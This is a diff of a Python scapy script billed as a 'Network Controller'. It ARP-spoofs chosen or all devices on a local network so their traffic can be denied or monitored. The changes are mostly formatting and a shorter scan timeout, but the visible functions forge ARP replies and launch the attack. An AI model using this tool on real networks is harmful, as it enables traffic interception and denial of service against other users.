@@ -6,15 +6,19 @@ import scapy.all as scapy
 import argparse
 import sys
 
+
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target_ip", help="Target IP")
-    parser.add_argument('-l', "--ips", dest="list_ip", nargs='+', type=str, help='List of IP addresses separated by comma')
+    parser.add_argument('-l', "--ips", dest="list_ip", nargs='+', type=str,
+                        help='List of IP addresses separated by comma')
     parser.add_argument("-a", "--all", dest="all", help="Spoof all devices in the network", action="store_true")
     parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP", required=True)
-    parser.add_argument("-m", "--mode", dest="mode", choices=['d', 'm'], required=True, help="To Deny(d) or Monitor(m) the traffic")
+    parser.add_argument("-m", "--mode", dest="mode", choices=['d', 'm'], required=True,
+                        help="To Deny(d) or Monitor(m) the traffic")
     parser.add_argument("-i", "--iface", dest="iface", help="Network Interface to Use", required=False)
-    parser.add_argument("--timeout", dest="timeout", type=int, help="Timeout for broadcasting ARP request", required=False)
+    parser.add_argument("--timeout", dest="timeout", type=int, help="Timeout for broadcasting ARP request",
+                        required=False)
 
     options = parser.parse_args()
     # Check if at least one argument was provided
@@ -37,7 +41,6 @@ def get_mac(ip):
         sys.exit(1)
 
 
-
 def spoof_arp_table(victim_ip, victim_mac, false_requester_ip):
     try:
         target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
@@ -57,7 +60,8 @@ def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester
         print("[-] Could not send ARP packet to " + victim_ip + ". Exiting.")
         sys.exit(1)
 
-def scan_network(ip, timeout=3):
+
+def scan_network(ip, timeout=2):
     arp_req = scapy.ARP(pdst=ip)
     # print(arp_req.summary())
     # scapy.ls(scapy.ARP())
@@ -86,6 +90,7 @@ def start_attack(target_ip, gateway_ip):
         restore_arp_table(gateway_ip, gateway_mac, target_ip, target_mac)
         print("[+] ARP Tables Reset Successfully")
 
+
 option = get_arguments()
 print("\n[+][+]\t\tWelcome to Network Controller\t\t[+][+]\n")
 if option.mode == 'd':
@@ -111,7 +116,3 @@ elif option.list_ip:
 else:
     pass
     # start_attack(option.target_ip, option.gateway_ip)
-
-
-
-
